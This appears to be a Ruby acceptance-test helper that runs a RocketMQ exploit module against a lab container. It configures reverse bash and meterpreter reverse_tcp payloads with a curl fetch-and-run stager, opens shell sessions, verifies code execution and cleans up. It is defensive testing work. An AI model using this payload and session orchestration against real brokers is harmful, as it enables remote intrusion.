# frozen_string_literal: true

require 'base64'
require 'digest'
require 'English'
require 'securerandom'
require 'timeout'
require_relative '../rocketmq/acceptance'

module Acceptance
  # Druid's proof paths and Flowise's service/user/payload settings are fixed to
  # those applications. Reuse their passive ready event, plus the common runner;
  # keep RocketMQ's command constraints, PID and native SDK boundary here.
  module RocketmqSessions
    include Rocketmq

    PAYLOADS = ['cmd/unix/reverse_bash', 'cmd/linux/http/x64/meterpreter/reverse_tcp'].freeze
    CALLBACK = 4461
    FETCH = 8091
    FETCH_NAME = 'module-target-rocketmq-fetch'

    def rmq_poll(seconds, &block)
      Timeout.timeout(seconds) { wait_for_expect(250, 0.1, &block) }
    end

    def rmq_json(expression)
      code = "puts 'RMQ_JSON=' + (#{expression}).to_json"
      output = console_command("irb -e #{code.inspect}")
      lines = output.lines.grep(/^RMQ_JSON=/)
      expect(lines.size).to eq(1), output
      JSON.parse(lines.first.delete_prefix('RMQ_JSON='))
    end

    def rmq_record(name, record)
      File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(record)) }
    end

    def rmq_native_snapshot(role, phase)
      @rmq_native_count = (@rmq_native_count || 0) + 1
      rocketmq_native(role, "#{phase}-#{@rmq_native_count}")
    end

    def rmq_restore(role, baseline)
      config = baseline.fetch('config')
      args = ['bash', '/lab/native.sh', 'restore', config.fetch('rocketmqHome'), config.fetch('filterServerNums')]
      output = target_exec(role, *args)
      data = JSON.parse(output.lines.grep(/^NATIVE_JSON=/).fetch(0).delete_prefix('NATIVE_JSON='))
      rmq_record('native-operator-restorations.jsonl', role: role, result: data)
      expect(data.fetch('update').fetch('code')).to eq(0)
      expect(data.fetch('snapshot').fetch('config')).to eq(config)
    end

    def rmq_options(payload, port = CALLBACK)
      options = { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port, 'ExitOnSession' => false, 'VERBOSE' => true }
      if payload.include?('meterpreter')
        options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => FETCH,
                       'FETCH_FILENAME' => FETCH_NAME, 'FETCH_URIPATH' => FETCH_NAME, 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_DELETE' => true)
      end
      options
    end

    def rmq_listeners(port)
      code = 'require "json";rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map{|path|File.readlines(path).drop(1).map(&:split)};puts JSON.generate(rows.select{|row|row[3]=="0A"&&row[1].split(":").last.to_i(16)==Integer(ARGV[0])})'
      JSON.parse(target_exec('framework', 'ruby', '-e', code, port.to_s))
    end

    def rmq_remote_connections(port, pid = nil)
      code = 'if test -n "$1";then for fd in /proc/"$1"/fd/*;do readlink "$fd" || true;done;fi;cat /proc/net/tcp /proc/net/tcp6'
      output = target_exec('vulnerable', 'bash', '-c', code, 'bash', pid.to_s)
      inodes = output.scan(/socket:\[(\d+)\]/).flatten
      rows = output.lines.map(&:split).select { |row| row.size > 9 && row[0].end_with?(':') && row[2].match?(/\A[A-F0-9]+:[A-F0-9]+\z/) }
      rows.select! { |row| row[2].split(':').last.to_i(16) == port && !%w[06 0A].include?(row[3]) }
      expect(rows.any? { |row| inodes.include?(row[9]) }).to be(true), output if pid
      rows
    end

    def rmq_wait_session(payload)
      identifier = nil
      rmq_poll(45) do
        path = File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')
        events = File.file?(path) ? File.readlines(path).map { |line| JSON.parse(line) } : []
        active = rmq_json('framework.sessions.keys')
        rows = events.select { |row| active.include?(row.fetch('id')) }
        expect(rows.size).to eq(1)
        expect(rows.first.fetch('type')).to eq(payload.include?('meterpreter') ? 'meterpreter' : 'shell')
        identifier = rows.first.fetch('id')
        expect(console.all_data).to include("#{payload.include?('meterpreter') ? 'Meterpreter' : 'Command shell'} session #{identifier} opened")
      end
      identifier
    end

    def rmq_use_and_exit(identifier, payload, port)
      path = "/tmp/module-target-rocketmq-proof-#{SecureRandom.hex(6)}"
      proof = rmq_json("RocketmqSessionControl.proof(framework,#{identifier},#{path.inspect})")
      expect(proof.fetch('type')).to eq(payload.include?('meterpreter') ? 'meterpreter' : 'shell')
      pid = proof.fetch('pid')
      expect(target_exec('vulnerable', 'cat', path)).to eq('rocketmq-session')
      expect(target_exec('vulnerable', 'stat', '-c', '%u:%g', path).strip).to eq('3000:3000')
      expect(target_exec('vulnerable', 'cat', "/proc/#{pid}/status")).to match(/^Uid:\s+3000\s+3000\s+3000\s+3000$/)
      proof['connections'] = rmq_remote_connections(port, pid)
      rmq_json("DruidSessionControl.dispatch(framework,'exit',#{identifier})")
      rmq_poll(20) { expect(target_exec('vulnerable', 'bash', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'bash', "/proc/#{pid}")).to eq('ABSENT') }
      # The remote process has exited. Close the host shell handle before
      # requiring the kernel FIN_WAIT2 record to disappear at the target.
      console_command("irb -e #{"framework.sessions[#{identifier}]&.shell_close".inspect}") unless payload.include?('meterpreter')
      rmq_poll(20) { expect(rmq_remote_connections(port)).to eq([]) }
      rmq_poll(15) { expect(rmq_json('framework.sessions.keys')).to eq([]) }
      target_exec('vulnerable', 'rm', '-f', path)
      proof.merge!('remote_pid_absent' => true, 'active_target_socket_absent' => true, 'host_session_absent' => true)
      rmq_record('session-lifecycles.jsonl', proof)
    end

    def rmq_cleanup_runtime
      console_command('sessions -K')
      console_command('jobs -K')
      rmq_poll(15) { expect(rmq_listeners(CALLBACK)).to eq([]) }
      rmq_poll(15) { expect(rmq_listeners(FETCH)).to eq([]) }
      expect(rmq_json('framework.sessions.keys')).to eq([])
      expect(rmq_json('framework.jobs.keys')).to eq([])
      rmq_poll(15) { expect(target_exec('vulnerable', 'bash', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'bash', "/tmp/#{FETCH_NAME}")).to eq('ABSENT') }
    end

    def rmq_calibrate(payload)
      record = { payload: payload, owner_calls: 0, status: 'starting' }
      remote = "/tmp/module-target-rocketmq-native-#{SecureRandom.hex(6)}"
      begin
        expect(rmq_json('framework.sessions.keys')).to eq([])
        console_command('back')
        console_command('use exploit/multi/handler')
        constraints = rmq_json('RocketmqSessionControl.constraints(active_module,framework)')
        expect(constraints.fetch('badchars')).to eq([39])
        rmq_options(payload).each { |key, value| expect(console_command("set #{key} #{value}")).not_to match(/Unknown datastore option|Invalid option/) }
        expect(console_command('run -j -z')).not_to include('[-]')
        jobs = rmq_json('framework.jobs.keys')
        expect(jobs.size).to eq(1)
        generated = rmq_json("RocketmqSessionControl.command(framework.jobs.fetch(#{jobs.first.inspect}),#{payload.inspect})")
        command = Base64.strict_decode64(generated.fetch('command_base64'))
        expect(command).not_to include("'")
        record.merge!(generated: generated, constraints: constraints)
        output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', 'vulnerable', 'bash', '-c', 'cat > "$1";chmod 700 "$1";sha256sum "$1";stat -c %u:%g "$1"', 'bash', remote, stdin_data: command)
        record[:install] = { output: output, error: error, exitstatus: status.exitstatus }
        expect(status.success?).to be(true), error
        expect(output).to include(generated.fetch('sha256'), '3000:3000')
        expect(target_exec('vulnerable', 'pwd').strip).to eq(@native.fetch('vulnerable').fetch('config').fetch('rocketmqHome') + '/bin')
        rmq_poll(15) { expect(rmq_listeners(CALLBACK)).not_to be_empty }
        target_exec('vulnerable', 'test', '!', '-e', "/tmp/#{FETCH_NAME}")
        output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', '-d', 'vulnerable', 'bash', remote)
        record[:launch] = { output: output, error: error, exitstatus: status.exitstatus }
        expect(status.success?).to be(true), error
        identifier = rmq_wait_session(payload)
        rmq_use_and_exit(identifier, payload, CALLBACK)
        record[:status] = 'native_passed'
      ensure
        failure = $ERROR_INFO
        record[:failure] = "#{failure.class}: #{failure.message}" if failure
        record[:status] = 'setup_failed' if failure
        errors = []
        [-> { rmq_cleanup_runtime }, -> { target_exec('vulnerable', 'rm', '-f', remote) }].each do |cleanup|
          cleanup.call
        rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
          errors << "#{e.class}: #{e.message}"
        end
        record[:cleanup_errors] = errors
        rmq_record('native-calibrations.jsonl', record)
        raise "Native calibration cleanup failed: #{errors.inspect}" if !failure && !errors.empty?
      end
    end

    def rmq_exploit(payload, auto_check: true)
      record = { payload: payload, auto_check: auto_check, status: 'started' }
      begin
        baseline = @native.fetch('vulnerable')
        current = rmq_native_snapshot('vulnerable', 'pre-owner')
        expect(current.fetch('config')).to eq(baseline.fetch('config'))
        output = run_target_module(EXPLOIT, 'vulnerable', rmq_options(payload).merge('AutoCheck' => auto_check, 'ConnectTimeout' => 3, 'WfsDelay' => 40), action: 'run -z', command_timeout: 65)
        record[:output] = output
        expect(output).to include('on Broker port: 10921')
        identifier = rmq_wait_session(payload)
        record[:session] = identifier
        rmq_use_and_exit(identifier, payload, CALLBACK)
        rmq_cleanup_runtime
        after = rmq_native_snapshot('vulnerable', 'post-owner')
        record[:after] = after
        expect(after.fetch('config')).to eq(baseline.fetch('config'))
        expect(after.fetch('broker_pid')).to eq(baseline.fetch('broker_pid'))
        record[:status] = 'passed'
      ensure
        failure = $ERROR_INFO
        record[:failure] = "#{failure.class}: #{failure.message}" if failure
        errors = []
        begin
          rmq_cleanup_runtime
        rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
          errors << "#{e.class}: #{e.message}"
        end
        if failure
          record[:native_recovery_required] = true
          begin
            rmq_restore('vulnerable', @native.fetch('vulnerable'))
          rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
            errors << "#{e.class}: #{e.message}"
          end
        end
        record[:cleanup_errors] = errors
        rmq_record('owning-sessions.jsonl', record)
        raise "Owning cleanup failed: #{errors.inspect}" if !failure && !errors.empty?
      end
    end
  end
end
